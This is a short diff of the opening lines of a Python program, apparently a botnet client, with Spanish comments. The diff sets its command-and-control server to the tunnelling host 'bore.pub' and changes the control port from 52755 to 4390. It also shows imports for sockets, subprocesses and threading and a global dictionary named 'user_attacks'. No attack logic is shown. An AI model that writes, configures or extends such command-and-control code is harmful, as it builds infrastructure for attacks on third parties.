@@ -1,8 +1,8 @@
 import subprocess, random, os, time, threading, socket, uuid, struct, platform
 
 # ─── CONFIGURACIÓN ─────────────────────────────────────────────────────────────
-C2_ADDRESS = "bore.pub"  # Cambia por la IP de tu CNC
-C2_PORT = 52755 # Cambia por el puerto de tu CNC
+C2_ADDRESS = "bore.pub"
+C2_PORT = 4390
 
 # ─── VARIABLES GLOBALES ──────────────────────────────────────────────────────
 user_attacks = {}
